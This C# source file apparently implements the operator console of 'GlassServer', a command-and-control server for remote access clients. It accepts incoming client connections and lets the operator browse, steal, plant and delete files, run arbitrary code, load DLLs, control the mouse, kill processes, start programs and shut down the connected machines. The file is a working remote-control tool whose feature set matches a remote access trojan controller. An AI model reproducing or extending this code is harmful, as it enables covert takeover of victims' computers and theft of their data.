﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

using GlassServer.Events;

namespace GlassServer
{
    public class GlassUI
    {
        public GlassListener GlassListener { get; private set; }
        public GlassClientManager GlassClientManager { get; private set; }

        public Dictionary<int, Client> IdentifiedClients = new Dictionary<int, Client>();

        public GlassUI(string ip, int port)
        {
            GlassListener = new GlassListener(ip, port);
            GlassClientManager = new GlassClientManager();

            GlassListener.ClientConnected += listener_ClientConnected;

            GlassClientManager.ClientDisconnected += manager_ClientDisconnected;
            GlassClientManager.CurrentDirectoryRecieved += manager_DirectoryRecieved;
            GlassClientManager.DirectoryListingRecieved += manager_DirectoryListingRecieved;
            GlassClientManager.FileListingRecieved += manager_FileListingRecieved;
            GlassClientManager.FileRecieved += manager_FileRecieved;
            GlassClientManager.IdentifyRecieved += manager_IdentifyRecieved;
            GlassClientManager.StdoutRecieved += manager_StdoutRecieved;
            GlassClientManager.ProcListRecieved += manager_ProcListRecieved;
            GlassClientManager.FileTextRecieved += manager_FileTextRecieved;
        }

        private Client selectedClient = null;
        public void Start()
        {
            GlassListener.ListenForConnections();
            int selectedClientID = 0;
            while (true)
            {
                try
                {
                    Console.Write("$ ");
                    string command = Console.ReadLine();
                    string[] parts = command.Split(' ');
                    string remainder = null;
                    if (parts.Length >= 2)
                        remainder = command.Substring(command.IndexOf(" ") + 1);
                    switch (parts[0].ToLower())
                    {
                        case "select":
                            try
                            {
                                int id = Convert.ToInt32(parts[1]);
                                selectedClient = IdentifiedClients[id];
                                selectedClientID = id;
                            }
                            catch
                            {
                                Console.WriteLine("Was not a number!");
                            }
                            break;
                        case "selected":
                            Console.WriteLine("{0}:\t{1} {2}", selectedClientID, selectedClient.UserName, selectedClient.IP);
                            break;
                        case "info":
                            var cl = IdentifiedClients[Convert.ToInt32(parts[1])];
                            Console.WriteLine("{0}:\t{1} {2}", parts[1], cl.UserName, cl.IP);
                            break;
                        case "list":
                            foreach (var pair in IdentifiedClients)
                                Console.WriteLine("{0}:\t{1} {2}", pair.Key, pair.Value.UserName, pair.Value.IP);
                            break;
                        case "pwd":
                            selectedClient.WriteLine(GlassProtocol.RequestCurrentDirectory);
                            break;
                        case "ls":
                            selectedClient.WriteLine(GlassProtocol.RequestDirectoryListing);
                            selectedClient.WriteLine(parts.Length < 2 ? selectedClient.CurrentDirectory : remainder);
                            selectedClient.WriteLine(GlassProtocol.RequestFileListing);
                            selectedClient.WriteLine(parts.Length < 2 ? selectedClient.CurrentDirectory : remainder);
                            break;
                        case "dl":
                            selectedClient.WriteLine(GlassProtocol.RequestFileDownload);
                            selectedClient.WriteLine(parts[1]);
                            selectedClient.WriteLine(parts[2]);
                            break;
                        case "cd":
                            selectedClient.WriteLine(GlassProtocol.SetCurrentDirectory);
                            selectedClient.WriteLine(remainder);
                            selectedClient.CurrentDirectory = remainder;
                            break;
                        case "get":
                            selectedClient.WriteLine(GlassProtocol.RequestFile);
                            selectedClient.WriteLine(parts[1]);
                            selectedClient.FileJobs.Push(parts[2]);
                            break;
                        case "vfsget":
                            selectedClient.WriteLine(GlassProtocol.RequestVFSFile);
                            selectedClient.WriteLine(parts[1]);
                            selectedClient.FileJobs.Push(parts[2]);
                            break;
                        case "put":
                            selectedClient.WriteLine(GlassProtocol.SendingFile);
                            selectedClient.WriteLine(parts[2]);
                            selectedClient.WriteLine(new FileInfo(parts[1]).Length);
                            BinaryReader file = new BinaryReader(new StreamReader(parts[1]).BaseStream);
                            while (file.BaseStream.Position < file.BaseStream.Length)
                                selectedClient.Writer.Write(file.ReadByte());
                            file.Close();
                            selectedClient.Writer.Flush();
                            break;
                        case "vfsput":
                            selectedClient.WriteLine(GlassProtocol.RequestVFSFileSave);
                            selectedClient.WriteLine(new FileInfo(parts[1]).Length);
                            selectedClient.WriteLine(parts[2]);
                            BinaryReader file_ = new BinaryReader(new StreamReader(parts[1]).BaseStream);
                            while (file_.BaseStream.Position < file_.BaseStream.Length)
                                selectedClient.Writer.Write(file_.ReadByte());
                            file_.Close();
                            selectedClient.Writer.Flush();
                            break;
                        case "rm":
                            selectedClient.WriteLine(GlassProtocol.RequestDeleteFile);
                            selectedClient.WriteLine(remainder);
                            break;
                        case "rmd":
                            selectedClient.WriteLine(GlassProtocol.RequestDeleteDir);
                            selectedClient.WriteLine(remainder);
                            break;
                        case "mv":
                            selectedClient.WriteLine(GlassProtocol.RequestFileMove);
                            selectedClient.WriteLine(parts[1]);
                            selectedClient.WriteLine(parts[2]);
                            break;
                        case "vfsmv":
                            selectedClient.WriteLine(GlassProtocol.RequestVFSFIleMove);
                            selectedClient.WriteLine(parts[1]);
                            selectedClient.WriteLine(remainder.Substring(remainder.IndexOf(" ") + 1));
                            break;
                        case "cat":
                            selectedClient.WriteLine(GlassProtocol.RequestFileText);
                            selectedClient.WriteLine(remainder);
                            break;
                        case "vfscat":
                            selectedClient.WriteLine(GlassProtocol.RequestVFSFileText);
                            selectedClient.WriteLine(remainder);
                            break;
                        case "cp":
                            selectedClient.WriteLine(GlassProtocol.RequestFileCopy);
                            selectedClient.WriteLine(parts[1]);
                            selectedClient.WriteLine(parts[2]);
                            break;
                        case "mp":
                            selectedClient.WriteLine(GlassProtocol.RequestSetMousePosition);
                            selectedClient.WriteLine(Convert.ToInt64(parts[1]));
                            selectedClient.WriteLine(Convert.ToInt64(parts[2]));
                            break;
                        case "mkdir":
                            selectedClient.WriteLine(GlassProtocol.RequestCreateDirectory);
                            selectedClient.WriteLine(remainder);
                            break;
                        case "leftclick":
                            selectedClient.WriteLine(GlassProtocol.RequestLeftMouseClick);
                            break;
                        case "rightclick":
                            selectedClient.WriteLine(GlassProtocol.RequestRightMouseClick);
                            break;
                        case "proclist":
                            selectedClient.WriteLine(GlassProtocol.RequestProcList);
                            break;
                        case "kill":
                            selectedClient.WriteLine(GlassProtocol.RequestProcKill);
                            selectedClient.WriteLine(remainder);
                            break;
                        case "coderun":
                            selectedClient.WriteLine(GlassProtocol.RequestCodeRun);
                            selectedClient.WriteLine(File.ReadAllText(remainder));
                            break;
                        case "dllload":
                            selectedClient.WriteLine(GlassProtocol.RequestDllLoad);
                            byte[] bytes = File.ReadAllBytes(parts[1]);
                            selectedClient.WriteLine((long)bytes.Length);
                            selectedClient.WriteLine(remainder.Substring(remainder.IndexOf(" ") + 1));
                            foreach (byte b in bytes)
                                selectedClient.WriteLine(b);
                            break;
                        case "localdllload":
                            selectedClient.WriteLine(GlassProtocol.RequestLocalDllLoad);
                            selectedClient.WriteLine(remainder);
                            break;
                        case "vfsdllload":
                            selectedClient.WriteLine(GlassProtocol.RequestVFSDllLoad);
                            selectedClient.WriteLine(parts[1]);
                            selectedClient.WriteLine(remainder.Substring(remainder.IndexOf(" ") + 1));
                            break;
                        case "msg":
                            selectedClient.WriteLine(GlassProtocol.RequestMessageDisplay);
                            selectedClient.WriteLine(remainder);
                            break;
                        case "start":
                            selectedClient.WriteLine(GlassProtocol.RequestProgramStart);
                            selectedClient.WriteLine(parts[1]);
                            selectedClient.WriteLine(parts.Length > 2 ? remainder.Substring(remainder.IndexOf(" ") + 1) : "");
                            break;
                        case "getstart":
                            selectedClient.WriteLine(GlassProtocol.RequestProgramStartStdout);
                            selectedClient.WriteLine(parts[1]);
                            selectedClient.WriteLine(parts.Length > 2 ? remainder.Substring(remainder.IndexOf(" ") + 1) : "");
                            break;
                        case "logout":
                            selectedClient.WriteLine(GlassProtocol.RequestLogout);
                            break;
                        case "restart":
                            selectedClient.WriteLine(GlassProtocol.RequestRestart);
                            break;
                        case "shutdown":
                            selectedClient.WriteLine(GlassProtocol.RequestShutdown);
                            break;
                    }
                }
                catch (NullReferenceException)
                {
                    Console.WriteLine("No client selected!");
                }
                catch (IOException)
                {
                    manager_ClientDisconnected(null, new ClientDisconnectedEventArgs { Client = selectedClient });
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error caught! " + ex.Message);
                }
            }
        }

        private void listener_ClientConnected(object sender, ClientConnectedEventArgs e)
        {
            GlassClientManager.RegisterClient(e.Client);
            e.Client.WriteLine(GlassProtocol.RequestCurrentDirectory);
        }

        private void manager_ClientDisconnected(object sender, ClientDisconnectedEventArgs e)
        {
            int removalClient = -1;
            foreach (var pair in IdentifiedClients)
                if (pair.Value == e.Client)
                {
                    if (pair.Value == selectedClient)
                        selectedClient = null;
                    Console.WriteLine("Client {0} has disconnected!", pair.Key);
                    removalClient = pair.Key;
                    break;
                }
            if (removalClient != -1)
                IdentifiedClients.Remove(removalClient);
        }

        private int id = 0;
        private void manager_IdentifyRecieved(object sender, IdentifyRecievedEventArgs e)
        {
            Console.WriteLine("IDENTIFY {0} from {1}", e.Client.UserName, e.Client.IP);
            Console.WriteLine("Identity is {0}.", e.Client.Identity = ++id);
            if (IdentifiedClients.ContainsKey(e.Client.Identity))
                IdentifiedClients.Remove(e.Client.Identity);
            IdentifiedClients.Add(e.Client.Identity, e.Client);
        }
        private void manager_DirectoryRecieved(object sender, CurrentDirectoryRecievedEventArgs e)
        {
            Console.WriteLine(e.Client.CurrentDirectory);
        }
        private void manager_DirectoryListingRecieved(object sender, DirectoryListingRecievedEventArgs e)
        {
            foreach (string dir in e.Directories)
                Console.Write("{0}\t", dir);
            Console.WriteLine();
        }
        private void manager_FileListingRecieved(object sender, FileListingRecievedEventArgs e)
        {
            foreach (string file in e.Files)
                Console.Write("{0}\t", file);
            Console.WriteLine();
        }
        private void manager_FileRecieved(object sender, FileRecievedEventArgs e)
        {
            Console.WriteLine("File recieved {0} size {1} bytes.", e.Client.FileJobs.Count > 0 ? e.Client.FileJobs.Peek() : "unknown", e.Length);
            string path = e.Client.FileJobs.Pop();
            BinaryWriter writer = new BinaryWriter(new StreamWriter(path).BaseStream);
            for (int i = 0; i < e.Length; i++)
                writer.Write(e.BinaryReader.ReadByte());
            writer.Close();
            Console.WriteLine("File saved!");
            GlassClientManager.ReadInput = true;
        }
        private void manager_StdoutRecieved(object sender, StdoutRecievedEventArgs e)
        {
            Console.WriteLine(e.Line);
        }
        private void manager_ProcListRecieved(object sender, ProcListRecievedEventArgs e)
        {
            foreach (string proc in e.ProcList.Split(' '))
                Console.Write("{0}  ", proc);
        }
        private void manager_FileTextRecieved(object sender, FileTextRecievedEventArgs e)
        {
            Console.WriteLine(e.FileText);
        }
    }
}